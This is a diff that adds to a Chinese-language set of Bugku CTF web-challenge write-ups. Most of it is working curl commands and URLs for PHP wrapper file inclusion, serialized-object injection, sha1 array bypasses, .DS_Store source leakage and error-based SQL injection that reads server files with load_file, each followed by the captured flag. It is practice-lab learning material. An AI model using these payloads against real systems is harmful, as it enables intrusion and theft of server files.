@@ -1218,7 +1218,46 @@ flag格式  flag{手机号}
 
 
 ===================================
+简单 waf
 ===================================
+curl http://120.24.86.145:9010/
+
+you are not admin ! <br>
+
+<!--
+$a=isset($_GET["a"])?$_GET["a"]:'';
+$b=isset($_GET["b"])?$_GET["b"]:'';
+$c=isset($_GET["c"])?$_GET["c"]:'';
+$d=isset($_GET["d"])?$_GET["d"]:'';
+$e=isset($_GET['e'])?$_GET['e']:'';
+
+if(preg_match('/php/i', $a)){
+    die("This not allow pseudo protocol!");
+}
+if(preg_match('/\.\./', $a)){
+    die("This also not allow!");
+}
+
+if((file_get_contents($a,'r')===$b)&&(file_get_contents($e,'r')==="I'm Administrator!")){
+    echo "hello admin!<br>";
+    if(preg_match("/flag/",$c)){
+        echo "不能现在就给你flag哦";
+        exit();
+    }else{
+        include($c);
+        if(preg_match('/base64/', $d)){
+            die("No! you can't use it!");
+        }
+        $d = unserialize($d);
+        echo $d;
+    }
+}else{
+    echo "you are not admin ! <br>";
+}
+-->
+
+访问 curl http://120.24.86.145:9010/flag.php
+返回 flag on my head
 
 flag 的 base64 编码 ZmxhZw==
 
@@ -1250,7 +1289,15 @@ data://text/plain;base64,SSdtIEFkbWluaXN0cmF0b3Ih
 
 curl -i -d "<?php phpinfo() ?>" "http://120.24.86.145:9010/?a=data://text/plain;base64,ZmxhZw==&b=flag&e=data://text/plain;base64,SSdtIEFkbWluaXN0cmF0b3Ih&d=s:3:'123';base64&c="
 
+尝试5：
+php 反序列化串 要 urlencode   urllib.urlencode({'d':'s:3:"123";'})
+d=s%3A3%3A%22123%22%3B
 
+curl -i -d "<?php phpinfo() ?>" "http://120.24.86.145:9010/?a=data://text/plain;base64,ZmxhZw==&b=flag&e=data://text/plain;base64,SSdtIEFkbWluaXN0cmF0b3Ih&d=s%3A3%3A%22123%22%3B&c=1.php"
+可以返回 "123"
+
+
+curl -i -d "<?php phpinfo() ?>" "http://120.24.86.145:9010/?a=data://text/plain;base64,ZmxhZw==&b=flag&e=data://text/plain;base64,SSdtIEFkbWluaXN0cmF0b3Ih&d=s%3A3%3A%22123%22%3B&c=php://filter/read=convert.base64-encode/resource=index.php"
 ============================
 urldecode二次编码绕过
 ============================
@@ -1438,6 +1485,7 @@ curl -d "cmd=cat index.php" http://118.89.219.210:49166/index.php?file=upload/20
  KEY{bb35dc123820e}
 
  =======================
+ flag.php
  =======================
 用 http://120.24.86.145:8002/flagphp/?hint
 可以返回 php 源码
@@ -1481,4 +1529,272 @@ $KEY='ISecer:www.isecer.com';
  $returnValue = serialize('ISecer:www.isecer.com');
  s:21:"ISecer:www.isecer.com";
 
-curl --cookie "ISecer=s:21:"ISecer:www.isecer.com""  http://120.24.86.145:8002/flagphp
+curl --cookie "ISecer=s:21:"ISecer:www.isecer.com""  http://120.24.86.145:8002/flagphp/
+尝试不成功，因为$key 是后赋值
+
+python urlencode
+
+import urllib 
+urllib.urlencode({'ISecer':'s:21:"ISecer:www.isecer.com";'})
+
+'ISecer=s%3A21%3A%22ISecer%3Awww.isecer.com%22%3B'
+
+提交空串
+s:0:""
+
+ISecer=s%3A0%3A%22%22%3B
+
+curl -i -v --cookie "ISecer=s%3A0%3A%22%22%3B"  http://120.24.86.145:8002/flagphp/
+返回
+flag{unserialize_by_virink}
+
+
+====================
+细心
+====================
+
+curl -i http://120.24.86.145:8002/web13/robots.txt
+
+
+User-agent: *
+Disallow: /
+
+curl -i http://120.24.86.145:8002/web13/resusl.php
+
+<html>
+<title>The result</title>
+<body bgcolor="#A8A8A8">
+<h2>The Result</h2>
+<hr \>
+
+<div align="center">
+<h3>Warning:你不是管理员你的IP已经被记录到日志了</h3><br><h2>121.69.61.206</h2>
+
+</div>
+<br><br><br><br><br>
+<hr \>
+<p>By bugkuctf. </p>
+<p>if ($_GET[x]==$password) 此处省略1w字</p>
+</body>
+</html>
+
+用http://120.24.86.145:8002/web13//resusl.php?x=admin
+返回
+flag(ctf_0098_lkji-s)
+
+========================
+welcome to bugkuctf
+========================
+120.24.86.145:8006/test1/
+
+you are not the number of bugku !   
+  
+<!--  
+$user = $_GET["txt"];  
+$file = $_GET["file"];  
+$pass = $_GET["password"];  
+  
+if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
+    echo "hello admin!<br>";  
+    include($file); //hint.php  
+}else{  
+    echo "you are not admin ! ";  
+}  
+ -->  
+
+考php 伪协议利用
+curl   -d "welcome to the bugkuctf" "http://120.24.86.145:8006/test1/index.php?txt=php://input&file=php://filter/read=convert.base64-encode/resource=hint.php"
+
+decode bsae64 后
+
+<?php  
+  
+class Flag{//flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+			echo "<br>";
+		return ("good");
+        }  
+    }  
+}  
+?>  
+
+不能直接用上面的方法读 flag.php
+考PHP 反序列化漏洞利用
+
+用上面方法读index.php 源文件
+curl   -d "welcome to the bugkuctf" "http://120.24.86.145:8006/test1/index.php?txt=php://input&file=php://filter/read=convert.base64-encode/resource=index.php"
+
+<?php  
+$txt = $_GET["txt"];  
+$file = $_GET["file"];  
+$password = $_GET["password"];  
+  
+if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
+    echo "hello friend!<br>";  
+    if(preg_match("/flag/",$file)){ 
+		echo "不能现在就给你flag哦";
+        exit();  
+    }else{  
+        include($file);   
+        $password = unserialize($password);  
+        echo $password;  
+    }  
+}else{  
+    echo "you are not the number of bugku ! ";  
+}  
+  
+?>  
+  
+<!--  
+$user = $_GET["txt"];  
+$file = $_GET["file"];  
+$pass = $_GET["password"];  
+  
+if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
+    echo "hello admin!<br>";  
+    include($file); //hint.php  
+}else{  
+    echo "you are not admin ! ";  
+}  
+ -->  
+
+ 可以传 password 为Flag 对象的序列化值
+ O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+ url编码后
+ O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D
+ curl   -d "welcome to the bugkuctf" "http://120.24.86.145:8006/test1/index.php?txt=php://input&file=hint.php&password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D"
+返回
+flag{php_is_the_best_language}
+
+
+======================
+各种绕过
+======================
+<?php 
+highlight_file('flag.php'); 
+$_GET['id'] = urldecode($_GET['id']); 
+$flag = 'flag{xxxxxxxxxxxxxxxxxx}'; 
+if (isset($_GET['uname']) and isset($_POST['passwd'])) { 
+    if ($_GET['uname'] == $_POST['passwd']) 
+
+        print 'passwd can not be uname.'; 
+
+    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin')) 
+
+        die('Flag: '.$flag); 
+
+    else 
+
+        print 'sorry!'; 
+
+} 
+?>
+
+php中md5()和sha1()漏洞为不能处理数组会返回1
+
+curl -d "passwd[]=12" "http://120.24.86.145:8002/web7/index.php?uname\[\]=11&id=margin"
+返回
+>Flag: flag{HACK_45hhs_213sDD}
+
+====================
+never give up
+====================
+view-source:http://120.24.86.145:8006/test/1p.html
+
+经过urldecode , base64 decode , urldecode 后
+
+";if(!$_GET['id'])
+{
+	header('Location: hello.php?id=1');
+	exit();
+}
+$id=$_GET['id'];
+$a=$_GET['a'];
+$b=$_GET['b'];
+if(stripos($a,'.'))
+{
+	echo 'no no no no no no no';
+	return ;
+}
+$data = @file_get_contents($a,'r');
+if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
+{
+	require("f4l2a3g.txt");
+}
+else
+{
+	print "never never never give up !!!";
+}
+
+
+?>
+
+直接访问 f4l2a3g.txt
+flag{tHis_iS_THe_fLaG}
+
+
+=====================
+sql注入2
+=====================
+用 curl --output ds_store http://120.24.86.145:8007/web2/.DS_Store
+取到 .DS_Store 文件
+
+使用一个 DS_Store 利用工具
+python ../ds_store_exp.py http://120.24.86.145:8007/web2/.DS_Store
+
+取到源文件
+直接代开flag文件
+flag{sql_iNJEct_comMon3600!}
+
+
+===========================
+报错注入
+===========================
+http://103.238.227.13:10088/?id=1
+返回数据 
+
+http://103.238.227.13:10088/?id=a 
+返回 
+Unknown column 'a' in 'where clause'
+
+http://103.238.227.13:10088/?id=1/**/order/**/by/**/3
+返回 
+Unknown column '3' in 'order clause'
+
+http://103.238.227.13:10088/?id=floor(rand()*2)
+随机返回数据
+
+http://103.238.227.13:10088/?id=1/**/and/**/1=1
+可以返回数据
+
+1 and(select 1 from (select count(*),concat(floor(rand(0)*2),0x5e5e5e,version(),0x5e5e5e) x from information_schema.columns group by x) y)
+http://103.238.227.13:10088/?id=1/**/and(select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x5e5e5e,version(),0x5e5e5e)/**/x/**/from/**/information_schema.columns/**/group/**/by/**/x)/**/y)
+返回 
+Duplicate entry '1^^^5.5.48-log^^^' for key 'group_key'
+
+database()
+返回 
+Duplicate entry '1^^^sql4^^^' for key 'group_key'
+
+SELECT LOAD_FILE('/var/test/key_1.php')
+0x2f7661722f746573742f6b65795f312e706870
+select load_file(0x2f7661722f746573742f6b65795f312e706870)
+
+http://103.238.227.13:10088/?id=1/**/and(select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x5e5e5e,LENGTH((select/**/load_file(0x2f7661722f746573742f6b65795f312e706870))),0x5e5e5e)/**/x/**/from/**/information_schema.columns/**/group/**/by/**/x)/**/y)
+返回 
+Duplicate entry '1^^^149^^^' for key 'group_key'
+
+http://103.238.227.13:10088/?id=1/**/and(select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x5e5e5e,substr((select/**/load_file(0x2f7661722f746573742f6b65795f312e706870)),80,149),0x5e5e5e)/**/x/**/from/**/information_schema.columns/**/group/**/by/**/x)/**/y)
+返回  
+Flag:"7249f5a7fd1de602b30e6f39aea6193a"
+Flag:”7249f5a7fd1de602b30e6f39aea6193a”
+
+也可以用换行符代替空格符
+通过extractvalue报错，注入语句如下
+http://103.238.227.13:10088/?id=1%0Aand%0aextractvalue(1,concat(0x7e,(select%0a@@version),0x7e))
+http://103.238.227.13:10088/?id=1%0aand%0a(extractvalue(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))%0afrom%0a161%0afor%0a20),0x7e)))
+
+
